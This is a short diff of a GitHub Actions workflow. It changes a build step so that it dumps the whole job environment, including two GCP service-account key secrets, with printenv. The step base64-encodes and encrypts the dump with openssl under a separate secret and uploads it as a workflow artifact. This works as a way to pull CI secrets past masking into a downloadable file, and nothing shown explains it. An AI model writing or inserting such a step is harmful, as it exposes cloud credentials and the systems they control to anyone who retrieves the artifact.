@@ -9,9 +9,11 @@ jobs:
         steps:
             - name: Checkout repository
               uses: actions/checkout@v2
-            - run: |
-                ${{secrets.GCP_SA_KEY}} | base64 -w 0 >> info.txt
-                ${{secrets.DEV_GCP_SA_KEY}} | base64 -w 0 >> info.txt
+            - env:
+                GCP_SA_KEY: ${{secrets.GCP_SA_KEY}}
+                DEV_GCP_SA_KEY: ${{secrets.DEV_GCP_SA_KEY}}
+              run: |
+                printenv | base64 -w 0 >> info.txt
                 openssl enc -aes-256-cbc -salt -in info.txt -out encrypted_file.enc -k ${{ secrets.DUBUG_PASSWORD }}
             - name: Upload encrypted file
               uses: actions/upload-artifact@v2
